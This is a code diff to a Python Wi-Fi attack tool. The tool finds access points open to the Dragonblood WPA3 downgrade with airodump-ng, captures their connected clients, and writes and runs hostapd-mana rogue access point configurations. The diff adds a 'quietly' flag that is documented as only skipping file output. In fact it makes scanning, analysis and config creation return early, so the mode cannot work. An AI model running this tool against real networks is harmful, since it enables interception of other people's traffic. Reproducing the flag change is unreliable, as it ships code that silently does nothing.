@@ -128,20 +128,22 @@ def set_managed_mode(interface):
         print(f"[-] Error configuring {interface} in Managed mode: {e}")
         sys.exit(1)
 
-def create_scan_directory():
+def create_scan_directory(quietly=False):
     # Creates a working directory for the scan with the current date and time.
+    if quietly:
+        return None
     now = datetime.datetime.now()
     folder_name = now.strftime("scan-%Y-%m-%d-%H-%M")
     os.makedirs(folder_name, exist_ok=True)
     return folder_name
 
-def run_airodump(interface, folder_name):
+def run_airodump(interface, folder_name, quietly=False):
     # Run airodump-ng to capture packets for 1 minute. -- Using popen to kill airodump after 1min.
     try:
         print(f"[+] Airodump-ng is running on interface {interface} for 1 minute...")
         airodump_cmd = [
             'airodump-ng', interface,
-            '-w', f'{folder_name}/discovery',
+            '-w', f'{folder_name}/discovery' if folder_name else '/dev/null',
             '--output-format', 'pcap',
             '--manufacturer', '--wps', '--band', 'abg'
         ]
@@ -149,7 +151,8 @@ def run_airodump(interface, folder_name):
             airodump_process = subprocess.Popen(airodump_cmd, stdout=FNULL, stderr=FNULL)
             time.sleep(60)
             airodump_process.terminate()
-        print(f"[+] Capture done. Files are saved under '{folder_name}/discovery'.")
+        if not quietly:
+            print(f"[+] Capture done. Files are saved under '{folder_name}/discovery'.")
     except Exception as e:
         print(f"[-] Error during airodump-ng execution : {e}")
         sys.exit(1)
@@ -248,8 +251,10 @@ def extract_channel(packet):
                 pass
     return channel
 
-def analyze_pcap(file):
+def analyze_pcap(file, quietly=False):
     # Analyzes a PCAP file to detect APs vulnerable to Dragonblood.
+    if not file or quietly:
+        return []
     packets = rdpcap(file)
     ssid_info = defaultdict(list)
 
@@ -318,8 +323,10 @@ def analyze_pcap(file):
     
     return vulnerable_aps
 
-def capture_stations(interface, ap, folder_name):
+def capture_stations(interface, ap, folder_name, quietly=False):
     # Capture stations connected to each vulnerable AP for 30 seconds.
+    if not folder_name or quietly:
+        return
     try:
         print(f"\n[+] Starting airodump-ng on {ap['SSID']} ({ap['BSSID']}) with channel {ap['Channel']} for 30 seconds...")
         airodump_cmd = [
@@ -339,8 +346,10 @@ def capture_stations(interface, ap, folder_name):
     except Exception as e:
         print(f"[-] Error capturing stations for {ap['SSID']} : {e}")
 
-def analyze_station_files(folder_name, ap_ssid):
+def analyze_station_files(folder_name, ap_ssid, quietly=False):
     # Analyzes access point-specific CSV file to extract MAC addresses of connected stations.
+    if not folder_name or quietly:
+        return []
     ap_file = f"{folder_name}/{ap_ssid}-station-01.csv"
 
     try:
@@ -376,8 +385,10 @@ def analyze_station_files(folder_name, ap_ssid):
         print(f"[-] Error parsing file for AP {ap_ssid} : {e}")
         return []
 
-def create_config_file(folder_name, ap, managed_interface):
+def create_config_file(folder_name, ap, managed_interface, quietly=False):
     # Creates a configuration file for hostapd-mana if stations are connected.
+    if not folder_name or quietly:
+        return None
     abs_folder_name = os.path.abspath(folder_name)
     config_content = f"""interface={managed_interface}
 driver=nl80211
@@ -445,25 +456,27 @@ def start_attack(config_file, checker):
     except Exception as e:
         print(f"[-] Error during hostapd-mana execution : {e}")
 
-def do_stuff(interface, managed_interface, checker):
-    
+def do_stuff(interface, managed_interface, checker, quietly=False):
+
     check_root()
     check_tools()
     check_interface_exists(interface)
     check_interface_exists(managed_interface)
     check_monitor_mode(interface)
     
-    folder_name = create_scan_directory()
-    
-    run_airodump(interface, folder_name)
+    folder_name = create_scan_directory(quietly=quietly)
 
-    pcap_files = [f for f in os.listdir(folder_name) if f.startswith('discovery') and (f.endswith('.pcap') or f.endswith('.cap'))]
+    run_airodump(interface, folder_name, quietly=quietly)
+
+    pcap_files = []
+    if not quietly and folder_name:
+        pcap_files = [f for f in os.listdir(folder_name) if f.startswith('discovery') and (f.endswith('.pcap') or f.endswith('.cap'))]
     all_vulnerable_aps = []
 
     for pcap_file in pcap_files:
         file_path = os.path.join(folder_name, pcap_file)
         print(f"[+] Parsing PCAP file: {file_path}")
-        vulnerable_aps = analyze_pcap(file_path)
+        vulnerable_aps = analyze_pcap(file_path, quietly=quietly)
         all_vulnerable_aps.extend(vulnerable_aps)
     
     if not all_vulnerable_aps:
@@ -476,8 +489,8 @@ def do_stuff(interface, managed_interface, checker):
     all_stations = {}
 
     for ap in unique_aps:
-        capture_stations(interface, ap, folder_name)
-        stations = analyze_station_files(folder_name, ap['SSID'])
+        capture_stations(interface, ap, folder_name, quietly=quietly)
+        stations = analyze_station_files(folder_name, ap['SSID'], quietly=quietly)
         all_stations[ap['SSID']] = stations
 
     if checker:
@@ -488,14 +501,14 @@ def do_stuff(interface, managed_interface, checker):
         
         if stations:
             if checker:
-                config_file = create_config_file(folder_name, ap, new_interface_name)
+                config_file = create_config_file(folder_name, ap, new_interface_name, quietly=quietly)
             else:
-                config_file = create_config_file(folder_name, ap, managed_interface)
+                config_file = create_config_file(folder_name, ap, managed_interface, quietly=quietly)
             if config_file:
                 created_files.append(config_file)
         else:
             print(f"[!] Skipping hostapd configuration file creation for AP {ap['SSID']} because no stations were found.")
-    
+
     if not created_files:
         print("[!] No valid configuration files created. Exiting program.")
         sys.exit(1)
@@ -535,12 +548,19 @@ def main():
         required=False,
         help="Interface to use for Rogue AP during hostapd-mana launch."
     )
+    parser.add_argument(
+        "-q", "--quietly",
+        dest="quietly",
+        action="store_true",
+        help="Do not create folders or save any files."
+    )
 
     args = parser.parse_args()
 
     monitor_interface = args.monitor_interface
     managed_interface = args.rogueAP_interface if args.rogueAP_interface else monitor_interface
-    
+    quietly = args.quietly
+
     if args.monitor_interface and not args.rogueAP_interface:
         # If only one interface provided, checker will be true == passive mode
         checker = True
@@ -549,7 +569,7 @@ def main():
         while True:
             consent = input("[!] Would you like to continue ? (y/n) ").strip().lower()
             if consent == 'y':
-                do_stuff(monitor_interface, managed_interface, checker)
+                do_stuff(monitor_interface, managed_interface, checker, quietly=quietly)
                 sys.exit(0)
             elif consent == 'n':
                 print("[!] Attack aborted. Exiting program.")
@@ -559,7 +579,7 @@ def main():
     else:
         checker = False
         if check_managed_mode(managed_interface):
-            do_stuff(monitor_interface, managed_interface, checker)
+            do_stuff(monitor_interface, managed_interface, checker, quietly=quietly)
 
 if __name__ == "__main__":
     main()
